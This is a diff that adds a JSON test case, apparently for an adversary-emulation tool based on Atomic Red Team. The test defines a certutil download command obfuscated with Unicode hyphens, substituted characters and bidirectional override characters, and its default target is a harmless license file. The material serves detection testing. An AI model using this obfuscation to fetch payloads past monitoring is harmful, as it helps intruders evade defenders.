@@ -1,0 +1,33 @@
+{
+    "name": "Obfuscated Command Line using special Unicode characters",
+    "description": "This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. \u1da0) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters). Reference: https://wietze.github.io/blog/windows-command-line-obfuscation ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "steps": "1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.\n\n\n  certutil \u2014\u0af9u\u0af0rl\u08b0ca\u08e2c\u0defhe  \u2013\u202espli\u0605t\u202e\u202d \u2212\"\u0d4f\u1da0\u0d78\" #{remote_file} #{local_path}\n\n\n2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.\n",
+        "name": "manual"
+    },
+    "id": "T1027",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Obfuscated Files or Information",
+    "source": "ART",
+    "uuid": "e68b945c-52d0-4dd9-a5e8-d173d70c448f",
+    "arguments": {
+        "remote_file": {
+            "description": "URL of file to download",
+            "type": "url",
+            "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+        },
+        "local_path": {
+            "description": "Local path/filename to save the downloaded file to",
+            "type": "path",
+            "default": "Atomic-license.txt"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
